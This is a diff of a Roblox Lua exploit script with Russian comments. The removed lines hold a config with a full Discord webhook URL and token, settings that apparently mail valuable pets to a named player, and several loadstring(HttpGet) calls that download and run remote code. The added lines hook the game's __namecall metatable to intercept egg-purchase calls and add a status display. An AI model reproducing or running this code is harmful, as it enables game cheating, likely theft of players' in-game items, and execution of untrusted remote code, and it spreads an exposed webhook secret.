@@ -1,71 +1,72 @@
-repeat
-    task.wait()
-until game:IsLoaded()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Network = ReplicatedStorage:WaitForChild("Network")
+local Eggs_RequestPurchase = Network:WaitForChild("Eggs_RequestPurchase") -- RemoteFunction
 
-repeat
-    task.wait()
-until game.PlaceId ~= nil
-print("[CLIENT] Loaded Game")
-task.wait(10)
+-- Создание GUI
+local ScreenGui = Instance.new("ScreenGui")
+local StatusLabel = Instance.new("TextLabel")
+local StatusSquare = Instance.new("Frame")
 
+-- Настройка GUI
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
+-- Настройка текста "STATUS:"
+StatusLabel.Parent = ScreenGui
+StatusLabel.Size = UDim2.new(0, 300, 0, 100) -- Увеличен текст
+StatusLabel.Position = UDim2.new(0.5, -200, 0, 10) -- Верхняя часть экрана
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "STATUS:"
+StatusLabel.TextColor3 = Color3.new(1, 1, 1)
+StatusLabel.Font = Enum.Font.SourceSansBold
+StatusLabel.TextSize = 72 -- Увеличенный размер текста
 
-game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-task.wait(2)
+-- Настройка квадрата
+StatusSquare.Parent = ScreenGui
+StatusSquare.Size = UDim2.new(0, 100, 0, 100)
+StatusSquare.Position = UDim2.new(0.5, 150, 0, 10) -- Рядом с текстом
+StatusSquare.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный по умолчанию
 
+-- Логика отслеживания вызовов
+local function checkEggPurchase()
+    local successDetected = false
 
+    -- Хук для отслеживания вызовов
+    local mt = getrawmetatable(game)
+    local oldNamecall = mt.__namecall
+    setreadonly(mt, false)
 
-getgenv().Config = {
-    Key = "free",
-    ClaimMail = true,
-    ClaimForeverPack = true,
-    SendWebhook = true,
-    Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq",
-    OnlySendObtainedHuge = false,
-    SendHuge = true,
-    PlayerToSend = "Octoptys",
-    PingUser = true,
-    UserId = "651452406974119966",
-    HidePlayerName = false
+    mt.__namecall = function(self, ...)
+        local method = getnamecallmethod()
+        if method == "InvokeServer" and self == Eggs_RequestPurchase then
+            local success = oldNamecall(self, ...) -- Выполняем оригинальный вызов
+            if success == true then
+                successDetected = true
+            end
+            return success
+        end
+        return oldNamecall(self, ...)
+    end
 
-}
+    setreadonly(mt, true)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KqRs/cal/main/bibis",true))()
+    -- Отслеживание статуса в течение 10 секунд
+    local startTime = os.clock()
+    while os.clock() - startTime < 10 do
+        if successDetected then
+            StatusSquare.BackgroundColor3 = Color3.new(0, 1, 0) -- Зеленый
+            return
+        end
+        task.wait(0.1)
+    end
 
-task.wait(2)
-getgenv().RngEvent = {
-    Selected_RngEgg = "First",
-    Rolling_Enabled = true,
-    Rolling_Delay = 0.1,
-    Visible_Rolling = false,
+    -- Если за 10 секунд вызов не был успешным
+    StatusSquare.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный
+end
 
-    Selected_Upgrades = {"RNGHugeLuck", "RNGEggLuck", "RNGHatchSpeed", "RNGBonusLuck", "RNGExtraEgg"},
-    AutoUpgrades_Enabled = true,
-    AutoMerchant_Enabled = true,
-    AutoSellPets_Enabled = true,
-    AutoSell_OnlyEventPets = false,
-    AutoBreakChests_Enabled = true,
-    Lucky_Dice_Enabled = true,
-    Lucky_Dice_Config = {
-        ["Fire Dice"] = {Craft = false, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Lucky Dice"] = {Craft = false, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Lucky Dice II"] = {Craft = false, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Lucky Dice III"] = {Craft = false, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Mega Lucky Dice"] = {Craft = false, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
-        ["Mega Lucky Dice II"] = {Craft = false, Use = true, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = 9},
-    },
-
-    Webhook_Url = "",
-    Discord_UserID = "",
-    Huge_Mail_User = "",
-    Huge_Mail_Enabled = false,
-
-    fps_boost = true,
-    fps_boost2 = true,
-    gui_stats_enabled = true,
-    print_all_info = false,
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/661ba97429a1d20f02880d1e9eeced08.lua"))()
-
-task.wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KqRs/cal/main/rlsa",true))()
+-- Запуск проверки каждые 10 минут
+task.spawn(function()
+    while true do
+        checkEggPurchase()
+        task.wait(600) -- Ждать 10 минут
+    end
+end)
